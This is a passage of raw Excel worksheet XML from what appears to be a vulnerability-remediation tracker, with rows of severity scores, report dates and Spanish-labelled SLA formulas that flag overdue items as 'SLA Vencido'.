        <v>10</v>
      </c>
      <c r="Q256" s="53" t="s">
        <v>1864</v>
      </c>
      <c r="T256" s="1">
        <v>45824</v>
      </c>
      <c r="U256" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>385</v>
      </c>
      <c r="V256" s="78">
        <f t="shared" si="10"/>
        <v>45834</v>
      </c>
      <c r="W256" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X256" s="9"/>
      <c r="Y256" s="9"/>
      <c r="Z256" s="9"/>
      <c r="AA256" s="9"/>
      <c r="AB256" s="65" t="s">
        <v>2957</v>
      </c>
      <c r="AC256" s="65" t="s">
        <v>2958</v>
      </c>
      <c r="AD256" s="65" t="s">
        <v>2959</v>
      </c>
      <c r="AE256" s="65" t="s">
        <v>2960</v>
      </c>
      <c r="AF256" s="65" t="s">
        <v>148</v>
      </c>
      <c r="AG256" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="257" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A257" s="5">
        <v>256</v>
      </c>
      <c r="B257" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C257" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D257" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G257" s="60" t="s">
        <v>2955</v>
      </c>
      <c r="I257" s="66" t="s">
        <v>2961</v>
      </c>
      <c r="J257" s="53" t="s">
        <v>1095</v>
      </c>
      <c r="L257" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M257" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N257">
        <v>10</v>
      </c>
      <c r="Q257" s="53" t="s">
        <v>1864</v>
      </c>
      <c r="T257" s="1">
        <v>45824</v>
      </c>
      <c r="U257" s="76">
        <f t="shared" ca="1" si="9"/>
        <v>385</v>
      </c>
      <c r="V257" s="78">
        <f t="shared" si="10"/>
        <v>45834</v>
      </c>
      <c r="W257" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB257" s="65" t="s">
        <v>2962</v>
      </c>
      <c r="AC257" s="65" t="s">
        <v>2963</v>
      </c>
      <c r="AD257" s="65" t="s">
        <v>2964</v>
      </c>
      <c r="AE257" s="65" t="s">
        <v>2960</v>
      </c>
      <c r="AF257" s="65" t="s">
        <v>148</v>
      </c>
      <c r="AG257" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="258" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A258" s="5">
        <v>257</v>
      </c>
      <c r="B258" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C258" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D258" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G258" s="60" t="s">
        <v>2955</v>
      </c>
      <c r="I258" t="s">
        <v>2965</v>
      </c>
      <c r="J258" t="s">
        <v>1095</v>
      </c>
      <c r="L258" s="50" t="s">
        <v>141</v>
      </c>
      <c r="M258" s="50" t="s">
        <v>42</v>
      </c>
      <c r="N258">
        <v>10</v>
      </c>
      <c r="Q258" t="s">
        <v>1864</v>
      </c>
      <c r="T258" s="1">
        <v>45827</v>
      </c>
      <c r="U258" s="76">
        <f t="shared" ref="U258:U259" ca="1" si="12">TODAY()-T258</f>
        <v>382</v>
      </c>
      <c r="V258" s="78">
        <f t="shared" si="10"/>
        <v>45837</v>
      </c>
      <c r="W258" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB258" s="65" t="s">
        <v>2966</v>
      </c>
      <c r="AC258" s="65" t="s">
        <v>2967</v>
      </c>
      <c r="AD258" s="65" t="s">
        <v>2968</v>
      </c>
      <c r="AE258" s="65" t="s">
        <v>2960</v>
      </c>
      <c r="AF258" s="65" t="s">
        <v>148</v>
      </c>
      <c r="AG258" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="259" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A259" s="5">
        <v>258</v>
      </c>
      <c r="B259" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C259" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D259" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G259" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H259" t="s">
        <v>2969</v>
      </c>
      <c r="I259" t="s">
        <v>2970</v>
      </c>
      <c r="J259" t="s">
        <v>91</v>
      </c>
      <c r="L259" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M259" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N259">
        <v>5.3</v>
      </c>
      <c r="Q259" t="s">
        <v>2971</v>
      </c>
      <c r="T259" s="1">
        <v>45845</v>
      </c>
      <c r="U259" s="76">
        <f t="shared" ca="1" si="12"/>
        <v>364</v>
      </c>
      <c r="V259" s="1">
        <f t="shared" si="10"/>
        <v>45935</v>
      </c>
      <c r="W259" s="76" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB259" s="65" t="s">
        <v>2972</v>
      </c>
      <c r="AC259" s="65" t="s">
        <v>2973</v>
      </c>
      <c r="AD259" s="65" t="s">
        <v>2974</v>
      </c>
      <c r="AE259" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG259" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="260" spans="1:33" ht="217.5" x14ac:dyDescent="0.35">
      <c r="A260" s="5">
        <v>259</v>
      </c>
      <c r="B260" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C260" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D260" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G260" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H260" t="s">
        <v>2976</v>
      </c>
      <c r="I260" t="s">
        <v>2977</v>
      </c>
      <c r="J260" t="s">
        <v>2978</v>
      </c>
      <c r="L260" s="50" t="s">
        <v>41</v>
      </c>
      <c r="M260" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N260">
        <v>6.5</v>
      </c>
      <c r="Q260" t="s">
        <v>2971</v>
      </c>
      <c r="T260" s="1">
        <v>45845</v>
      </c>
      <c r="U260" s="76">
        <f t="shared" ref="U260:U267" ca="1" si="13">TODAY()-T260</f>
        <v>364</v>
      </c>
      <c r="V260" s="1">
        <f t="shared" ref="V260:V267" si="14">IF(M260="Critical",T260+10,IF(M260="High",T260+30,IF(M260="Bad",T260+30,IF(M260="Medium",T260+90,IF(M260="Warm",T260+90,IF(M260="Low",T260+120,IF(M260="Fair",T260+120,IF(M260="Neutral",T260+120,""))))))))</f>
        <v>45935</v>
      </c>
      <c r="W260" s="76" t="str">
        <f t="shared" ref="W260:W267" ca="1" si="15">IF(M260="Critical",IF(U260&gt;10,"SLA Vencido","En SLA"),IF(M260="High",IF(U260&gt;30,"SLA Vencido","En SLA"),IF(M260="Bad",IF(U260&gt;30,"SLA Vencido","En SLA"),IF(M260="Medium",IF(U260&gt;90,"SLA Vencido","En SLA"),IF(M260="Warm",IF(U260&gt;90,"SLA Vencido","En SLA"),IF(M260="Low",IF(U260&gt;120,"SLA Vencido","En SLA"),IF(M260="Fair",IF(U260&gt;120,"SLA Vencido","En SLA"),IF(M260="Neutral",IF(U260&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB260" s="65" t="s">
        <v>2979</v>
      </c>
      <c r="AC260" s="65" t="s">
        <v>2980</v>
      </c>
      <c r="AD260" s="65" t="s">
        <v>2981</v>
      </c>
      <c r="AE260" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG260" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="261" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A261" s="5">
        <v>260</v>
      </c>
      <c r="B261" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C261" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D261" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G261" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="I261" t="s">
        <v>2982</v>
      </c>
      <c r="J261" t="s">
        <v>2983</v>
      </c>
      <c r="L261" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M261" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N261">
        <v>3.9</v>
      </c>
      <c r="Q261" s="65" t="s">
        <v>2984</v>
      </c>
      <c r="T261" s="1">
        <v>45845</v>
      </c>
      <c r="U261" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>364</v>
      </c>
      <c r="V261" s="1">
        <f t="shared" si="14"/>
        <v>45965</v>
      </c>
      <c r="W261" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB261" s="65" t="s">
        <v>2518</v>
      </c>
      <c r="AC261" s="65" t="s">
        <v>2985</v>
      </c>
      <c r="AD261" s="65" t="s">
        <v>2986</v>
      </c>
      <c r="AE261" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG261" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="262" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A262" s="5">
        <v>261</v>
      </c>
      <c r="B262" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C262" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D262" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G262" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="I262" t="s">
        <v>2987</v>
      </c>
      <c r="J262" t="s">
        <v>1625</v>
      </c>
      <c r="L262" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M262" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N262">
        <v>3.8</v>
      </c>
      <c r="Q262" t="s">
        <v>2971</v>
      </c>
      <c r="T262" s="1">
        <v>45845</v>
      </c>
      <c r="U262" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>364</v>
      </c>
      <c r="V262" s="1">
        <f t="shared" si="14"/>
        <v>45965</v>
      </c>
      <c r="W262" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB262" s="65" t="s">
        <v>1626</v>
      </c>
      <c r="AC262" s="65" t="s">
        <v>2988</v>
      </c>
      <c r="AD262" s="65" t="s">
        <v>2989</v>
      </c>
      <c r="AE262" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG262" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="263" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A263" s="5">
        <v>262</v>
      </c>
      <c r="B263" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C263" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D263" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G263" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="I263" t="s">
        <v>2990</v>
      </c>
      <c r="J263" t="s">
        <v>1635</v>
      </c>
      <c r="L263" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M263" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N263">
        <v>3.8</v>
      </c>
      <c r="Q263" t="s">
        <v>2971</v>
      </c>
      <c r="T263" s="1">
        <v>45845</v>
      </c>
      <c r="U263" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>364</v>
      </c>
      <c r="V263" s="1">
        <f t="shared" si="14"/>
        <v>45965</v>
      </c>
      <c r="W263" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB263" s="65" t="s">
        <v>2991</v>
      </c>
      <c r="AC263" s="65" t="s">
        <v>2992</v>
      </c>
      <c r="AD263" s="65" t="s">
        <v>2993</v>
      </c>
      <c r="AE263" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG263" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="264" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A264" s="5">
        <v>263</v>
      </c>
      <c r="B264" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C264" s="50" t="s">
        <v>33</v>
      </c>
      <c r="D264" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G264" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="I264" t="s">
        <v>2994</v>
      </c>
      <c r="J264" t="s">
        <v>1645</v>
      </c>
      <c r="L264" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M264" s="50" t="s">
        <v>111</v>
      </c>
      <c r="N264">
        <v>3.8</v>
      </c>
      <c r="Q264" t="s">
        <v>2971</v>
      </c>
      <c r="T264" s="1">
        <v>45845</v>
      </c>
      <c r="U264" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>364</v>
      </c>
      <c r="V264" s="1">
        <f t="shared" si="14"/>
        <v>45965</v>
      </c>
      <c r="W264" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB264" s="65" t="s">
        <v>2995</v>
      </c>
      <c r="AC264" s="65" t="s">
        <v>2996</v>
      </c>
      <c r="AD264" s="65" t="s">
        <v>2997</v>
      </c>
      <c r="AE264" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG264" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="265" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A265" s="5">
        <v>264</v>
      </c>
      <c r="B265" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C265" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D265" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G265" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H265" t="s">
        <v>2998</v>
      </c>
      <c r="J265" t="s">
        <v>1086</v>
      </c>
      <c r="L265" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M265" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N265">
        <v>4.7</v>
      </c>
      <c r="Q265" t="s">
        <v>2999</v>
      </c>
      <c r="T265" s="1">
        <v>45850</v>
      </c>
      <c r="U265" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>359</v>
      </c>
      <c r="V265" s="1">
        <f t="shared" si="14"/>
        <v>45940</v>
      </c>
      <c r="W265" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB265" s="65" t="s">
        <v>1979</v>
      </c>
      <c r="AC265" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE265" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG265" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="266" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A266" s="5">
        <v>265</v>
      </c>
      <c r="B266" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C266" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D266" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G266" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H266" t="s">
        <v>3000</v>
      </c>
      <c r="J266" t="s">
        <v>1086</v>
      </c>
      <c r="L266" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M266" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N266">
        <v>4.7</v>
      </c>
      <c r="Q266" t="s">
        <v>3001</v>
      </c>
      <c r="T266" s="1">
        <v>45836</v>
      </c>
      <c r="U266" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>373</v>
      </c>
      <c r="V266" s="1">
        <f t="shared" si="14"/>
        <v>45926</v>
      </c>
      <c r="W266" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB266" s="65" t="s">
        <v>1979</v>
      </c>
      <c r="AC266" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE266" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG266" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="267" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A267" s="5">
        <v>266</v>
      </c>
      <c r="B267" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C267" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D267" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G267" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H267" t="s">
        <v>3002</v>
      </c>
      <c r="J267" t="s">
        <v>1086</v>
      </c>
      <c r="L267" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M267" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N267">
        <v>4.7</v>
      </c>
      <c r="Q267" t="s">
        <v>3003</v>
      </c>
      <c r="T267" s="1">
        <v>45856</v>
      </c>
      <c r="U267" s="76">
        <f t="shared" ca="1" si="13"/>
        <v>353</v>
      </c>
      <c r="V267" s="1">
        <f t="shared" si="14"/>
        <v>45946</v>
      </c>
      <c r="W267" s="76" t="str">
        <f t="shared" ca="1" si="15"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB267" s="65" t="s">
        <v>1979</v>
      </c>
      <c r="AC267" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE267" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG267" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="268" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A268" s="5">
        <v>267</v>
      </c>
      <c r="B268" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C268" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D268" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G268" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H268" t="s">
        <v>3004</v>
      </c>
      <c r="J268" t="s">
        <v>1086</v>
      </c>
      <c r="L268" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M268" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N268">
        <v>4.7</v>
      </c>
      <c r="Q268" t="s">
        <v>3005</v>
      </c>
      <c r="T268" s="1">
        <v>45850</v>
      </c>
      <c r="U268" s="76">
        <f t="shared" ref="U268:U271" ca="1" si="16">TODAY()-T268</f>
        <v>359</v>
      </c>
      <c r="V268" s="1">
        <f t="shared" ref="V268:V271" si="17">IF(M268="Critical",T268+10,IF(M268="High",T268+30,IF(M268="Bad",T268+30,IF(M268="Medium",T268+90,IF(M268="Warm",T268+90,IF(M268="Low",T268+120,IF(M268="Fair",T268+120,IF(M268="Neutral",T268+120,""))))))))</f>
        <v>45940</v>
      </c>
      <c r="W268" s="76" t="str">
        <f t="shared" ref="W268:W271" ca="1" si="18">IF(M268="Critical",IF(U268&gt;10,"SLA Vencido","En SLA"),IF(M268="High",IF(U268&gt;30,"SLA Vencido","En SLA"),IF(M268="Bad",IF(U268&gt;30,"SLA Vencido","En SLA"),IF(M268="Medium",IF(U268&gt;90,"SLA Vencido","En SLA"),IF(M268="Warm",IF(U268&gt;90,"SLA Vencido","En SLA"),IF(M268="Low",IF(U268&gt;120,"SLA Vencido","En SLA"),IF(M268="Fair",IF(U268&gt;120,"SLA Vencido","En SLA"),IF(M268="Neutral",IF(U268&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB268" s="65" t="s">
        <v>1979</v>
      </c>
      <c r="AC268" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE268" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG268" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="269" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A269" s="5">
        <v>268</v>
      </c>
      <c r="B269" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C269" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D269" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G269" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H269" t="s">
        <v>3006</v>
      </c>
      <c r="J269" t="s">
        <v>1086</v>
      </c>
      <c r="L269" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M269" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N269">
        <v>4.7</v>
      </c>
      <c r="Q269" t="s">
        <v>3007</v>
      </c>
      <c r="T269" s="1">
        <v>45856</v>
      </c>
      <c r="U269" s="76">
        <f t="shared" ca="1" si="16"/>
        <v>353</v>
      </c>
      <c r="V269" s="1">
        <f t="shared" si="17"/>
        <v>45946</v>
      </c>
      <c r="W269" s="76" t="str">
        <f t="shared" ca="1" si="18"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB269" s="65" t="s">
        <v>1979</v>
      </c>
      <c r="AC269" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE269" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG269" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="270" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A270" s="5">
        <v>269</v>
      </c>
      <c r="B270" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C270" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D270" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G270" s="60" t="s">
        <v>3008</v>
      </c>
      <c r="H270" t="s">
        <v>1731</v>
      </c>
      <c r="J270" t="s">
        <v>556</v>
      </c>
      <c r="L270" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M270" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N270">
        <v>4.7</v>
      </c>
      <c r="Q270" t="s">
        <v>1725</v>
      </c>
      <c r="T270" s="1">
        <v>45779</v>
      </c>
      <c r="U270" s="76">
        <f t="shared" ca="1" si="16"/>
        <v>430</v>
      </c>
      <c r="V270" s="1">
        <f t="shared" si="17"/>
        <v>45869</v>
      </c>
      <c r="W270" s="76" t="str">
        <f t="shared" ca="1" si="18"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB270" s="65" t="s">
        <v>1726</v>
      </c>
      <c r="AC270" s="65" t="s">
        <v>1727</v>
      </c>
      <c r="AE270" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG270" t="s">
        <v>3009</v>
      </c>
    </row>
    <row r="271" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A271" s="5">
        <v>270</v>
      </c>
      <c r="B271" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C271" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D271" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G271" s="60" t="s">
        <v>3008</v>
      </c>
      <c r="H271" t="s">
        <v>1735</v>
      </c>
      <c r="J271" t="s">
        <v>560</v>
      </c>
      <c r="L271" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M271" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N271">
        <v>4.7</v>
      </c>
      <c r="Q271" t="s">
        <v>1725</v>
      </c>
      <c r="T271" s="1">
        <v>45779</v>
      </c>
      <c r="U271" s="76">
        <f t="shared" ca="1" si="16"/>
        <v>430</v>
      </c>
      <c r="V271" s="1">
        <f t="shared" si="17"/>
        <v>45869</v>
      </c>
      <c r="W271" s="76" t="str">
        <f t="shared" ca="1" si="18"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB271" s="65" t="s">
        <v>1733</v>
      </c>
      <c r="AC271" s="65" t="s">
        <v>1734</v>
      </c>
      <c r="AE271" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG271" t="s">
        <v>3009</v>
      </c>
    </row>
    <row r="272" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A272" s="5">
        <v>271</v>
      </c>
      <c r="B272" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C272" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D272" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G272" s="60" t="s">
        <v>2886</v>
      </c>
      <c r="H272" t="s">
        <v>3010</v>
      </c>
      <c r="J272" t="s">
        <v>1086</v>
      </c>
      <c r="L272" s="50" t="s">
        <v>655</v>
      </c>
      <c r="M272" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N272">
        <v>4.7</v>
      </c>
      <c r="Q272" t="s">
        <v>3011</v>
      </c>
      <c r="T272" s="1">
        <v>45724</v>
      </c>
      <c r="U272" s="76">
        <f t="shared" ref="U272:U273" ca="1" si="19">TODAY()-T272</f>
        <v>485</v>
      </c>
      <c r="V272" s="1">
        <f t="shared" ref="V272:V273" si="20">IF(M272="Critical",T272+10,IF(M272="High",T272+30,IF(M272="Bad",T272+30,IF(M272="Medium",T272+90,IF(M272="Warm",T272+90,IF(M272="Low",T272+120,IF(M272="Fair",T272+120,IF(M272="Neutral",T272+120,""))))))))</f>
        <v>45814</v>
      </c>
      <c r="W272" s="76" t="str">
        <f t="shared" ref="W272:W273" ca="1" si="21">IF(M272="Critical",IF(U272&gt;10,"SLA Vencido","En SLA"),IF(M272="High",IF(U272&gt;30,"SLA Vencido","En SLA"),IF(M272="Bad",IF(U272&gt;30,"SLA Vencido","En SLA"),IF(M272="Medium",IF(U272&gt;90,"SLA Vencido","En SLA"),IF(M272="Warm",IF(U272&gt;90,"SLA Vencido","En SLA"),IF(M272="Low",IF(U272&gt;120,"SLA Vencido","En SLA"),IF(M272="Fair",IF(U272&gt;120,"SLA Vencido","En SLA"),IF(M272="Neutral",IF(U272&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB272" s="65" t="s">
        <v>1979</v>
      </c>
      <c r="AC272" s="65" t="s">
        <v>1980</v>
      </c>
      <c r="AE272" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG272" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="273" spans="1:33" x14ac:dyDescent="0.35">
      <c r="A273" s="5">
        <v>272</v>
      </c>
      <c r="B273" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C273" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D273" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G273" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H273" t="s">
        <v>3012</v>
      </c>
      <c r="J273" t="s">
        <v>1726</v>
      </c>
      <c r="L273" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M273" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N273">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q273" t="s">
        <v>3013</v>
      </c>
      <c r="T273" s="1">
        <v>45871</v>
      </c>
      <c r="U273" s="76">
        <f t="shared" ca="1" si="19"/>
        <v>338</v>
      </c>
      <c r="V273" s="1">
        <f t="shared" si="20"/>
        <v>45961</v>
      </c>
      <c r="W273" s="76" t="str">
        <f t="shared" ca="1" si="21"/>
        <v>SLA Vencido</v>
      </c>
      <c r="AB273" t="s">
        <v>1726</v>
      </c>
      <c r="AC273" s="65" t="s">
        <v>1727</v>
      </c>
      <c r="AE273" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG273" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="274" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A274" s="5">
        <v>273</v>
      </c>
      <c r="B274" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C274" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D274" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G274" s="60" t="s">
        <v>2067</v>
      </c>
      <c r="H274" t="s">
        <v>3014</v>
      </c>
      <c r="J274" t="s">
        <v>1733</v>
      </c>
      <c r="L274" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M274" s="50" t="s">
        <v>61</v>
      </c>
      <c r="N274">
        <v>4.0999999999999996</v>
      </c>
      <c r="Q274" t="s">
        <v>3013</v>
      </c>
      <c r="T274" s="1">
        <v>45871</v>
      </c>
      <c r="U274" s="76">
        <f t="shared" ref="U274:U281" ca="1" si="22">TODAY()-T274</f>
        <v>338</v>
      </c>
      <c r="V274" s="1">
        <f t="shared" ref="V274:V282" si="23">IF(M274="Critical",T274+10,IF(M274="High",T274+30,IF(M274="Bad",T274+30,IF(M274="Medium",T274+90,IF(M274="Warm",T274+90,IF(M274="Low",T274+120,IF(M274="Fair",T274+120,IF(M274="Neutral",T274+120,""))))))))</f>
        <v>45961</v>
      </c>
      <c r="W274" s="76" t="str">
        <f t="shared" ref="W274:W281" ca="1" si="24">IF(M274="Critical",IF(U274&gt;10,"SLA Vencido","En SLA"),IF(M274="High",IF(U274&gt;30,"SLA Vencido","En SLA"),IF(M274="Bad",IF(U274&gt;30,"SLA Vencido","En SLA"),IF(M274="Medium",IF(U274&gt;90,"SLA Vencido","En SLA"),IF(M274="Warm",IF(U274&gt;90,"SLA Vencido","En SLA"),IF(M274="Low",IF(U274&gt;120,"SLA Vencido","En SLA"),IF(M274="Fair",IF(U274&gt;120,"SLA Vencido","En SLA"),IF(M274="Neutral",IF(U274&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="AB274" t="s">
        <v>1733</v>
      </c>
      <c r="AC274" s="65" t="s">
        <v>1734</v>
      </c>
      <c r="AE274" s="65" t="s">
        <v>2975</v>
      </c>
      <c r="AG274" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="275" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A275" s="5">
        <v>274</v>
      </c>
      <c r="B275" s="50" t="s">
        <v>2044</v>
      </c>
      <c r="C275" s="50" t="s">
        <v>225</v>
      </c>
      <c r="D275" s="50" t="s">
        <v>34</v>
      </c>
      <c r="G275" s="60" t="s">
        <v>2067</v>
